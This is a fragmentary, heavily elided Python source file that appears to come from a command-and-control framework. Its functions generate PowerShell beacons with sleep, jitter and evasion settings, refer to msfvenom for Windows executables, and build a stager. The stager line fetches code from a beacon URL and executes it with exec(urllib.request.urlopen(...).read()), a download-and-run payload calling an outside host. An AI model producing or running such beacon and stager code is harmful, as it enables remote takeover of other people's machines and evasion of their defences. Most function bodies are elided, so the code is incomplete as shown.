...
def generate_beacon(
    ...
    try:
        ...
        if platform == "powershell":
            ...
            results["error"] = (
                "Windows EXE generation requires compilation (use msfvenom or custom compiler)"
            )
            results["code"] = (
...
def _generate_powershell_beacon(
    c2_url: str, beacon_id: str, sleep_time: int, jitter: float, evasion: str
) -> str:
...
def generate_stager(beacon_url: str, platform: str = "powershell") -> Dict[str, Any]:
    ...
    try:
        if platform == "powershell":
            ...
            results["code"] = (
                f"import urllib.request;exec(urllib.request.urlopen('{beacon_url}').read())"
            )
            results["oneliner"] = (
